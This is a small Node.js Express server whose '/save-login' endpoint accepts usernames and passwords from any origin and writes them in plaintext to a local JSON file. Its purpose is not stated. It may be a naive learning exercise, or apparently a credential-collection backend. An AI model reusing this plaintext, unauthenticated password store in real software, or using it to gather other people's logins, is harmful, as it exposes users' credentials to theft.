const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");

const app = express();
app.use(cors());
app.use(bodyParser.json());

const DATA_FILE = "login-data.json";

app.post("/save-login", (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ message: "Invalid data" });
  }

  const newData = { username, password };

  // Save data to JSON file
  fs.readFile(DATA_FILE, "utf8", (err, data) => {
    const currentData = err ? [] : JSON.parse(data || "[]");
    currentData.push(newData);

    fs.writeFile(DATA_FILE, JSON.stringify(currentData, null, 2), (err) => {
      if (err) {
        console.error("Error saving data:", err);
        return res.status(500).json({ message: "Failed to save data" });
      }
      res.status(200).json({ message: "Data saved successfully" });
    });
  });
});

// Start the server
const PORT = 5000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
